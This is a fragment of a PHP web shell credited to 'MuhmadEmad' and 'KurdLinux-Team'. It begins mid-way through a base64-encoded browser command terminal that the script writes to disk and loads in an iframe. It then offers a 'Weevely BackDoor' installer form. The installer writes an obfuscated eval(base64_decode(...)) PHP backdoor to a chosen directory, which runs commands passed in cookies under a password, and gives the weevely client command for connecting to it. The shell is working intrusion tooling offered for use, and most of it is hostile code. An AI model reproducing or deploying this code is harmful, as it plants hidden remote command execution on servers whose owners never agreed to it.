VuZ3RoLTFdLnN1YnN0cihhbGxbYWxsLmxlbmd0aC0xXS5pbmRleE9mKCIjIikpLnN1YnN0cigyLCAyKT09ImNkIikNCiB7DQogIGUucHJldmVudERlZmF1bHQoKTsNCiAgd2luZG93LmNvbW1hbmRzLnB1c2goYWxsW2FsbC5sZW5ndGgtMV0uc3Vic3RyKGFsbFthbGwubGVuZ3RoLTFdLmluZGV4T2YoIiMiKSkuc3Vic3RyKDIpKTsNCiAgaWYgKGFsbFthbGwubGVuZ3RoLTFdLnN1YnN0cihhbGxbYWxsLmxlbmd0aC0xXS5pbmRleE9mKCIjIikpLnN1YnN0cig1KT09In4iKQ0KICB7DQogICB3aW5kb3cuY3dkID0gd2luZG93LmhvbWVjd2Q7DQogICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnZhbHVlICs9ICJcbiI7ICBuZXdjbWQoKTsNCiAgfQ0KICBlbHNlDQogIHsNCiAgIGFwcGVuZGRpcmVjdG9yeShhbGxbYWxsLmxlbmd0aC0xXS5zdWJzdHIoYWxsW2FsbC5sZW5ndGgtMV0uaW5kZXhPZigiIyIpKS5zdWJzdHIoNSkpOw0KICAgcG9zdEFzeW5jaHJvbm91c0FqYXgoIjw/cGhwIGVjaG8oJHRmKTsgPz4iLCAidmVyaWZ5PSIrdXJsZW5jb2RlKHdpbmRvdy5jd2QpKTsNCiAgfQ0KIH0NCiBlbHNlDQogew0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgKz0gIlxuIjsNCiAgd2luZG93LmNvbW1hbmRzLnB1c2goYWxsW2FsbC5sZW5ndGgtMV0uc3Vic3RyKGFsbFthbGwubGVuZ3RoLTFdLmluZGV4T2YoIiMiKSkuc3Vic3RyKDIpKTsNCiAgcG9zdEFzeW5jaHJvbm91c0FqYXgoIjw/cGhwIGVjaG8oJHRmKTsgPz4iLCAianhjbWQ9Iit1cmxlbmNvZGUoYWxsW2FsbC5sZW5ndGgtMV0uc3Vic3RyKGFsbFthbGwubGVuZ3RoLTFdLmluZGV4T2YoIiMiKSkuc3Vic3RyKDIpKSsiJmN3ZD0iK3dpbmRvdy5jd2QpOw0KIH0NCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNjcm9sbFRvcD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNjcm9sbEhlaWdodDsNCn0NCmZ1bmN0aW9uIGJzcChlKQ0Kew0KIHZhciBhbGwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnZhbHVlLnNwbGl0KCJcbiIpOw0KIGlmIChhbGxbYWxsLmxlbmd0aC0xXS5sZW5ndGg9PShhbGxbYWxsLmxlbmd0aC0xXS5pbmRleE9mKCIjIikrMikpDQogZS5wcmV2ZW50RGVmYXVsdCgpOw0KfQ0KPD9waHAgZWNobygnZnVuY3Rpb24gcGFyc2VrZXkoZSwgdGhzKXtpZiAoZS5rZXlDb2RlPT0xMyl7ZXhlYyhlKTt9ZWxzZSBpZihlLmtleUNvZGU9PTM4KXtjbWR1cChlKTtyZXR1cm4gZmFsc2U7fWVsc2UgaWYoZS5rZXlDb2RlPT00MCl7Y21kb3duKGUpO3JldHVybiBmYWxzZTt9ZWxzZSBpZihlLmtleUNvZGU9PTgpe2JzcChlKTt9fTwvc2NyaXB0Pjx0ZXh0YXJlYSByb3dzPTcgY29scz0xMzAgaWQ9ImNvbW1hbmQiIG9ua2V5cHJlc3M9InBhcnNla2V5KGV2ZW50LCB0aGlzKTsiPjwvdGV4dGFyZWE+PGJyPicpOz8+DQo8c2NyaXB0Pg0KbmV3Y21kKCk7DQo8L3NjcmlwdD4NCg==';

$file = fopen("..php" ,"w+");
$write = fwrite ($file ,base64_decode($sss));
fclose($file);
echo "<iframe src=.cmd/..php width=80% height=110% ></iframe><br><br> ";

}
?>
<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<form method=post><font color=Green size=4 face="comic sans ms">BackConnect<font><br>
<font size=3 color=white>--==[[ <input type=submit name=wee value="Weevely BackDoor"> ]]==--</font></form>
<p>
<?php
//
if(isset($_POST['wee']))
{
    echo "
	<center><font color='#14ab00' size='3'>
<form action='' method='post'>
Directory to install weevely backdoor:<br>
<input type='text' name='weev_dir' size='50' class='text' value='$dir'><br>
Name of file (something .php)<br>
<input type='text' name='weev_name' class='text' value='weevely.php'><br>
Password (more than 3 characters)<br>
<input type='text' name='weev_pass' class='text'><br>
<input type='submit' name='install_weev' value='BackDoor'><br>
</font>
</center>
<center> Go To Weevely </center><center>./weevely.py site password </center>
";
}
if (isset($_POST['install_weev'])) {
    $weevdir = rtrim($_POST['weev_dir'], '/');;
    $weevname = $_POST['weev_name'];
    $weevpassword = $_POST['weev_pass'];
    if (strlen($weevpassword) < 3) {
        error("Password must be longer than 3 characters!");
    } else {
        $first2 = $weevpassword[0] . $weevpassword[1];
        $rest = substr($weevpassword, 2);
        $money = "$";
        $weevelybd1 = base64_decode('ZnVuY3Rpb24gd2VldmVseSgpIHsNCiRjPSdjb3VudCc7DQokYT0kX0NPT0tJRTs=');
        $weevelybd2 = "if(reset($money" . "a)=='" . $first2 . "' && $money" . "c($money" . "a)>3) {";
        $weevelybd3 = "$money" . "k='$rest';";
        $weevelybd4 = base64_decode('ZWNobyAnPCcuJGsuJz4nOw0KZXZhbChiYXNlNjRfZGVjb2RlKHByZWdfcmVwbGFjZShhcnJheSgnL1teXHc9XHNdLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKSwgam9pbihhcnJheV9zbGljZSgkYSwkYygkYSktMykpKSkpOw0KZWNobyAnPC8nLiRrLic+JzsNCn0NCn0NCndlZXZlbHkoKTs=');
        $all = "<?php\neval(base64_decode('" . base64_encode($weevelybd1 . $weevelybd2 . $weevelybd3 . $weevelybd4) . "'));\n?>";
        if (file_put_contents($weevdir . '/' . $weevname, $all)) {
            echo "<center><font color='#14ab00' size='3'>Usage: weevely [URL of backdoor] [password]</font></center><br>";
            success("weevely");
        } else {
            error("Failed to write backdoor to $weevdir");
        }
    }
}
?>

<form method=post>
<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<?/**^_^**/?>
<? echo'	</i>
</font>
</span><font face="Tahoma" size="2">
<p align="center"><b><i><font color="#808000"><a href="http://www.kurdlinux.com">
<font color="#808000"><span style="text-decoration: none">KurdLinux-Team </span></font></a></font></i></b></p>
</span><font face="Tahoma" size="2">
<center>
<p align="center"><b><i><font color="Yalow"><a href="https://www.facebook.com/muhmad.abdullkarem">
<font color="#808000"><span style="text-decoration: none">(C) By MuhmadEmad 2014 (V) 1.0</span></font></a></font></i></b></p>
<center>
 </html><b><span style="text-shadow: 0px 0px 8px ;"><font face="Tahoma" size="2" color="#808000"><strong> <font face="Tahoma" size="2" color="#808000"><a href=""><marquee direction="right" style="font-family: Tahoma; color: #2E2EFE; border: 1px dotted #808000; " width="930" height="20">(--Thanks My Best BrotherS ::Ali HAwleRy -- HaremNawzad--)</marquee></a></font></strong></font></span></b><font face="Gulim" color="#808000" size="4"></font><font face="Gulim" size="4" color="#808000">&nbsp;</font><font face="Gulim" color="#808000" size="5"></font></p></html>
</center>
<font face="Webdings" size="6" color="#FF0000">!</font><font face="Tahoma">
';
?>
<?/**end**/?><?/** ((C)) in 36 Day |by Red Hat|muhmademad**/?>
